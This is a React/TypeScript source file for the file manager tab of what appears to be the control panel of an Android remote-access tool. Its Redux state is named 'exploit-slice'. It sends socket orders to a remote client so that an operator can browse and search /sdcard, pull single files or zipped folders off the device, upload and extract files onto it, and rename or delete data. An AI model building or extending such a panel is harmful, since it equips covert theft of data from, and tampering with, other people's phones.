
import { useEffect, useState } from 'react'
import JSZip from 'jszip'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import {
  Folder,
  File as FileIcon,
  ChevronLeft,
  FolderOpen,
  Download,
  Upload,
  Loader2,
  CheckCircle2,
  Search,
  FolderPlus,
  Pencil,
  Trash2,
  FileArchive,
  RefreshCw,
  HardDriveUpload,
} from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppDispatch, useAppSelector } from '@/store/hooks'
import { setFilesPath, clientData } from '@/store/slices/exploit-slice'
import {
  useUploadChunkedMutation,
  useUnzipOnDeviceMutation,
} from '@/store/api/backend-api'
import { formatBytes, classNames } from '@/lib/format'
import type { FileEntry } from '@/store/slices/exploit-slice'

export function FilesTab({ clientId }: { clientId: string }) {
  const dispatch = useAppDispatch()
  const state = useAppSelector((s) => s.exploit.byClient[clientId])
  const path = state?.filesPath ?? '/sdcard'
  const files = state?.files ?? []
  const downloads = state?.downloads ?? {}
  const searchResults = state?.searchResults ?? []
  const searchQuery = state?.searchQuery ?? null

  const [uploading, setUploading] = useState(false)
  const [uploadMsg, setUploadMsg] = useState<string | null>(null)
  const [uploadProgress, setUploadProgress] = useState<number | null>(null)
  const [uploadChunked] = useUploadChunkedMutation()
  const [unzip] = useUnzipOnDeviceMutation()

  // search UI state
  const [searchOpen, setSearchOpen] = useState(false)
  const [qRoot, setQRoot] = useState('/sdcard')
  const [qText, setQText] = useState('')

  // request listing on mount
  useEffect(() => {
    emitOrder(clientId, 'file_manager', { path })
    setQRoot(path)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  // refresh listing whenever a file op ack (delete/rename/mkdir) arrives —
  // watch the acks array length for this client.
  const ackCount = state?.acks?.length ?? 0
  useEffect(() => {
    // re-fetch listing on ack changes (delete/rename/mkdir success)
    if (ackCount > 0) {
      const lastAck = state?.acks?.[0]
      if (
        lastAck &&
        ['file_delete', 'file_rename', 'file_mkdir'].includes(lastAck.type)
      ) {
        const t = setTimeout(
          () => emitOrder(clientId, 'file_manager', { path }),
          400,
        )
        return () => clearTimeout(t)
      }
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [ackCount])

  const navigate = (p: string) => {
    dispatch(setFilesPath({ id: clientId, path: p }))
    emitOrder(clientId, 'file_manager', { path: p })
  }
  const goBack = () => {
    const parts = path.split('/')
    parts.pop()
    navigate(parts.join('/') || '/')
  }
  const refresh = () => emitOrder(clientId, 'file_manager', { path })

  const onFileClick = (f: FileEntry) => {
    if (f.isDir) navigate(f.path)
    else downloadFile(f)
  }
  const downloadFile = (f: FileEntry) => {
    if (confirm(`Download ${f.name}?`)) {
      emitOrder(clientId, 'file_download', { path: f.path })
    }
  }
  const downloadDirAsZip = (f: FileEntry) => {
    if (confirm(`Download "${f.name}" as ZIP?`)) {
      // The device zips the directory and streams it back as file_download_*.
      emitOrder(clientId, 'file_download', { path: f.path })
    }
  }

  const rename = (f: FileEntry) => {
    const newName = prompt(`Rename "${f.name}" to:`, f.name)
    if (newName && newName !== f.name) {
      emitOrder(clientId, 'file_rename', { path: f.path, newName })
    }
  }
  const del = (f: FileEntry) => {
    if (confirm(`Delete ${f.isDir ? 'folder' : 'file'} "${f.name}"?`)) {
      emitOrder(clientId, 'file_delete', { path: f.path })
    }
  }
  const newFolder = () => {
    const name = prompt('New folder name:')
    if (name) {
      const p = path.endsWith('/') ? path + name : path + '/' + name
      emitOrder(clientId, 'file_mkdir', { path: p })
    }
  }
  const zipOnDevice = (f: FileEntry) => {
    const dest = prompt(
      `ZIP destination path:`,
      f.path.endsWith('/') ? f.path + 'archive.zip' : f.path + '.zip',
    )
    if (dest) emitOrder(clientId, 'file_zip', { source: f.path, dest })
  }

  const runSearch = () => {
    if (!qText) return
    emitOrder(clientId, 'file_search', {
      path: qRoot,
      query: qText,
      max: 50,
    })
  }

  // ── Upload file (chunked) ──
  const onUploadFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    e.target.value = ''
    if (!file) return
    setUploading(true)
    setUploadProgress(0)
    setUploadMsg(`Uploading ${file.name}…`)
    try {
      const destPath = `${path}/${file.name}`.replace(/\/+/g, '/')
      const b64 = await readAsBase64(file)
      const CHUNK = 256 * 1024
      const totalChunks = Math.ceil(b64.length / CHUNK)
      await uploadChunked({
        clientId,
        path: destPath,
        action: 'start',
        totalChunks,
        totalSize: file.size,
      }).unwrap()
      for (let i = 0; i < totalChunks; i++) {
        const chunk = b64.slice(i * CHUNK, (i + 1) * CHUNK)
        await uploadChunked({
          clientId,
          path: destPath,
          action: 'chunk',
          chunkIndex: i,
          totalChunks,
          data: chunk,
        }).unwrap()
        setUploadProgress(Math.round(((i + 1) / totalChunks) * 100))
      }
      await uploadChunked({ clientId, path: destPath, action: 'end' }).unwrap()
      setUploadMsg(`Uploaded ${file.name}`)
      setTimeout(() => emitOrder(clientId, 'file_manager', { path }), 600)
    } catch (err: any) {
      setUploadMsg(`Upload failed: ${err?.message ?? err}`)
    } finally {
      setUploading(false)
      setTimeout(() => {
        setUploadMsg(null)
        setUploadProgress(null)
      }, 3500)
    }
  }

  // ── Upload folder (zip client-side → chunked upload → unzip on device) ──
  const onUploadFolder = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const fileList = e.target.files
    e.target.value = ''
    if (!fileList || fileList.length === 0) return
    const files = Array.from(fileList)
    setUploading(true)
    setUploadProgress(0)
    setUploadMsg(`Compressing ${files.length} files…`)
    try {
      const folderName = files[0].webkitRelativePath?.split('/')[0] || 'folder'
      const zipName = `${folderName}_upload_${Date.now()}.zip`
      const destZip = `${path}/${zipName}`.replace(/\/+/g, '/')
      const destFolder = `${path}/${folderName}`.replace(/\/+/g, '/')

      const zip = new JSZip()
      for (let i = 0; i < files.length; i++) {
        zip.file(files[i].webkitRelativePath || files[i].name, files[i])
        if (i % 10 === 0) setUploadMsg(`Compressing ${i + 1}/${files.length}…`)
      }
      const blob = await zip.generateAsync(
        { type: 'blob', compression: 'DEFLATE', compressionOptions: { level: 6 } },
        (meta) => setUploadMsg(`Generating ZIP… ${Math.round(meta.percent)}%`),
      )

      setUploadMsg(`Uploading ${zipName} (${(blob.size / 1024 / 1024).toFixed(1)} MB)…`)
      await uploadBlobToClient(blob, destZip, clientId, uploadChunked, (p) =>
        setUploadProgress(p),
      )

      setUploadMsg('Extracting on device…')
      await unzip({
        clientId,
        zipPath: destZip,
        destDir: destFolder,
      }).unwrap()

      setUploadMsg(`Folder uploaded & extracted: ${folderName}`)
      setTimeout(() => emitOrder(clientId, 'file_manager', { path }), 800)
    } catch (err: any) {
      setUploadMsg(`Folder upload failed: ${err?.message ?? err}`)
    } finally {
      setUploading(false)
      setTimeout(() => {
        setUploadMsg(null)
        setUploadProgress(null)
      }, 4000)
    }
  }

  const activeDownloads = Object.values(downloads).filter(
    (d) => !d.complete && !d.error,
  )
  const completedDownloads = Object.values(downloads).filter(
    (d) => d.complete,
  )

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-center gap-2 flex-wrap">
        <FolderOpen className="h-4 w-4 text-emerald-400 shrink-0" />
        <h3 className="text-sm font-semibold text-zinc-100">File Manager</h3>
        <code className="text-[11px] text-zinc-400 font-mono truncate flex-1 bg-black/40 px-2 py-1 rounded border border-white/10 min-w-0">
          {path}
        </code>
      </div>

      {/* Toolbar */}
      <div className="flex flex-wrap items-center gap-2">
        <Button
          variant="outline"
          size="sm"
          onClick={goBack}
          disabled={path === '/' || path === '/sdcard'}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <ChevronLeft className="h-4 w-4" /> Up
        </Button>
        <Button
          variant="outline"
          size="sm"
          onClick={refresh}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <RefreshCw className="h-3.5 w-3.5" /> Refresh
        </Button>
        <Button
          variant="outline"
          size="sm"
          onClick={newFolder}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <FolderPlus className="h-3.5 w-3.5" /> New Folder
        </Button>
        <Button
          variant="outline"
          size="sm"
          onClick={() => {
            setQRoot(path)
            setSearchOpen((v) => !v)
          }}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <Search className="h-3.5 w-3.5" /> Search
        </Button>
        <label className="ml-auto">
          <input type="file" className="hidden" onChange={onUploadFile} disabled={uploading} />
          <span className="inline-flex h-8 cursor-pointer items-center gap-1.5 rounded-md bg-emerald-500/15 px-3 text-xs font-medium text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950 transition-colors">
            {uploading ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Upload className="h-3.5 w-3.5" />}
            File
          </span>
        </label>
        <label>
          <input
            type="file"
            className="hidden"
            onChange={onUploadFolder}
            // @ts-expect-error webkitdirectory is non-standard
            webkitdirectory=""
            directory=""
            multiple
            disabled={uploading}
          />
          <span className="inline-flex h-8 cursor-pointer items-center gap-1.5 rounded-md bg-emerald-500/15 px-3 text-xs font-medium text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950 transition-colors">
            {uploading ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <HardDriveUpload className="h-3.5 w-3.5" />}
            Folder
          </span>
        </label>
      </div>

      {/* Search bar */}
      {searchOpen && (
        <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/[0.04] p-3 space-y-2">
          <div className="flex items-end gap-2">
            <div className="flex-1 space-y-1">
              <Label className="text-[10px] uppercase tracking-wider text-zinc-500">Search root</Label>
              <Input
                value={qRoot}
                onChange={(e) => setQRoot(e.target.value)}
                className="bg-black/40 border-white/10 font-mono text-xs h-8"
              />
            </div>
            <div className="flex-1 space-y-1">
              <Label className="text-[10px] uppercase tracking-wider text-zinc-500">Query</Label>
              <Input
                value={qText}
                onChange={(e) => setQText(e.target.value)}
                placeholder="filename…"
                className="bg-black/40 border-white/10 font-mono text-xs h-8"
                onKeyDown={(e) => e.key === 'Enter' && runSearch()}
              />
            </div>
            <Button
              size="sm"
              onClick={runSearch}
              disabled={!qText}
              className="h-8 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
            >
              <Search className="h-3.5 w-3.5" /> Find
            </Button>
          </div>
        </div>
      )}

      {/* Upload status */}
      {(uploadMsg || uploadProgress !== null) && (
        <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 px-3 py-2 text-xs text-emerald-300">
          <div className="flex items-center gap-2">
            {uploading ? (
              <Loader2 className="h-3.5 w-3.5 animate-spin" />
            ) : (
              <CheckCircle2 className="h-3.5 w-3.5" />
            )}
            {uploadMsg}
          </div>
          {uploadProgress !== null && uploading && (
            <div className="mt-1.5 h-1.5 overflow-hidden rounded-full bg-black/40">
              <div
                className="h-full bg-emerald-400 transition-all"
                style={{ width: `${uploadProgress}%` }}
              />
            </div>
          )}
        </div>
      )}

      {/* Search results */}
      {searchQuery !== null && (
        <div className="rounded-xl border border-emerald-500/20 bg-zinc-950/60">
          <div className="flex items-center justify-between px-3 py-2 border-b border-white/10">
            <span className="text-[11px] uppercase tracking-wider text-emerald-300">
              Search: "{searchQuery}" ({searchResults.length})
            </span>
            <Button
              variant="ghost"
              size="sm"
              onClick={() => {
                dispatch(
                  clientData({
                    id: clientId,
                    data: { type: 'file_search', data: [], query: null },
                  }),
                )
              }}
              className="text-zinc-500 hover:text-zinc-300 h-6 px-2"
            >
              Clear
            </Button>
          </div>
          <div className="max-h-60 overflow-y-auto scrollbar-emerald divide-y divide-white/5">
            {searchResults.length === 0 ? (
              <div className="px-3 py-6 text-center text-xs text-zinc-600">No results</div>
            ) : (
              searchResults.map((f, i) => (
                <button
                  key={i}
                  onClick={() => downloadFile(f)}
                  className="flex w-full items-center gap-3 px-3 py-1.5 text-left hover:bg-white/[0.03] text-xs"
                >
                  <FileIcon className="h-3.5 w-3.5 text-zinc-500" />
                  <span className="text-zinc-200 truncate flex-1">{f.name}</span>
                  <span className="text-zinc-600 font-mono truncate">{f.path}</span>
                  {f.size ? (
                    <span className="text-zinc-500">{formatBytes(f.size)}</span>
                  ) : null}
                </button>
              ))
            )}
          </div>
        </div>
      )}

      {/* File list */}
      <div className="rounded-xl border border-white/10 bg-black/30 overflow-hidden">
        {files.length === 0 ? (
          <div className="px-4 py-8 text-center text-xs text-zinc-600">
            No files. Refresh or navigate into a directory.
          </div>
        ) : (
          files.map((f, i) => (
            <div
              key={i}
              className="group flex items-center gap-3 px-3 py-2 hover:bg-emerald-500/[0.04] border-b border-white/5 last:border-b-0"
            >
              <button
                onClick={() => onFileClick(f)}
                className="flex flex-1 items-center gap-3 min-w-0 text-left"
              >
                <span className="text-base shrink-0">{f.isDir ? '📁' : '📄'}</span>
                <span className="flex-1 truncate text-sm text-zinc-200">{f.name}</span>
                {!f.isDir && f.size ? (
                  <span className="text-[11px] text-zinc-500">{formatBytes(f.size)}</span>
                ) : null}
              </button>
              {/* per-item actions */}
              <div className="flex shrink-0 items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                {f.isDir ? (
                  <>
                    <IconBtn title="Download as ZIP" onClick={() => downloadDirAsZip(f)}>
                      <FileArchive className="h-3.5 w-3.5" />
                    </IconBtn>
                    <IconBtn title="ZIP on device" onClick={() => zipOnDevice(f)}>
                      <Download className="h-3.5 w-3.5" />
                    </IconBtn>
                  </>
                ) : (
                  <IconBtn title="Download" onClick={() => downloadFile(f)}>
                    <Download className="h-3.5 w-3.5" />
                  </IconBtn>
                )}
                <IconBtn title="Rename" onClick={() => rename(f)}>
                  <Pencil className="h-3.5 w-3.5" />
                </IconBtn>
                <IconBtn title="Delete" onClick={() => del(f)} danger>
                  <Trash2 className="h-3.5 w-3.5" />
                </IconBtn>
              </div>
            </div>
          ))
        )}
      </div>

      {/* Transfers */}
      {(activeDownloads.length > 0 || completedDownloads.length > 0) && (
        <div className="space-y-1.5">
          <div className="text-[11px] uppercase tracking-wider text-zinc-500">
            Transfers
          </div>
          {[...activeDownloads, ...completedDownloads].map((d, i) => (
            <div
              key={i}
              className="flex items-center gap-3 rounded-lg border border-white/10 bg-zinc-950/60 px-3 py-2 text-xs"
            >
              {d.complete ? (
                <CheckCircle2 className="h-4 w-4 text-emerald-400" />
              ) : (
                <Loader2 className="h-4 w-4 animate-spin text-emerald-400" />
              )}
              <span className="font-mono text-zinc-300 truncate flex-1">{d.name}</span>
              {d.speed && !d.complete && (
                <span className="text-zinc-500">{d.speed} MB/s</span>
              )}
              <span className="text-zinc-400 tabular-nums">{d.progress}%</span>
              {d.complete && d.url && (
                <a
                  href={d.url}
                  target="_blank"
                  rel="noreferrer"
                  className="text-emerald-400 hover:text-emerald-300"
                >
                  <Download className="h-3.5 w-3.5" />
                </a>
              )}
            </div>
          ))}
        </div>
      )}
    </div>
  )
}

function IconBtn({
  title,
  onClick,
  children,
  danger,
}: {
  title: string
  onClick: () => void
  children: React.ReactNode
  danger?: boolean
}) {
  return (
    <button
      title={title}
      onClick={(e) => {
        e.stopPropagation()
        onClick()
      }}
      className={classNames(
        'grid h-7 w-7 place-items-center rounded-md border border-white/10 bg-black/30 transition-colors',
        danger
          ? 'text-zinc-400 hover:text-rose-300 hover:border-rose-500/30'
          : 'text-zinc-400 hover:text-emerald-300 hover:border-emerald-500/30',
      )}
    >
      {children}
    </button>
  )
}

// ── helpers ──

function readAsBase64(file: File): Promise<string> {
  return new Promise((resolve, reject) => {
    const r = new FileReader()
    r.onload = () => {
      const s = String(r.result || '')
      const c = s.indexOf(',')
      resolve(c >= 0 ? s.slice(c + 1) : s)
    }
    r.onerror = reject
    r.readAsDataURL(file)
  })
}

async function blobToBase64(blob: Blob): Promise<string> {
  return new Promise((resolve, reject) => {
    const r = new FileReader()
    r.onload = () => {
      const s = String(r.result || '')
      const c = s.indexOf(',')
      resolve(c >= 0 ? s.slice(c + 1) : s)
    }
    r.onerror = reject
    r.readAsDataURL(blob)
  })
}

// Chunked-upload a Blob (the zipped folder) to the device using the RTK Query
// uploadChunked mutation. Retries each chunk a few times on failure.
async function uploadBlobToClient(
  blob: Blob,
  destPath: string,
  clientId: string,
  uploadChunked: ReturnType<typeof useUploadChunkedMutation>[0],
  onProgress: (pct: number) => void,
) {
  const CHUNK = 512 * 1024
  const totalChunks = Math.ceil(blob.size / CHUNK)
  await uploadChunked({
    clientId,
    path: destPath,
    action: 'start',
    totalChunks,
    totalSize: blob.size,
  }).unwrap()
  for (let i = 0; i < totalChunks; i++) {
    const start = i * CHUNK
    const end = Math.min(start + CHUNK, blob.size)
    const chunk = blob.slice(start, end)
    const b64 = await blobToBase64(chunk)
    let retries = 5
    while (retries > 0) {
      try {
        await uploadChunked({
          clientId,
          path: destPath,
          action: 'chunk',
          chunkIndex: i,
          totalChunks,
          data: b64,
        }).unwrap()
        break
      } catch {
        retries--
        await new Promise((r) => setTimeout(r, 1000))
      }
    }
    onProgress(Math.round(((i + 1) / totalChunks) * 100))
  }
  await uploadChunked({ clientId, path: destPath, action: 'end' }).unwrap()
}
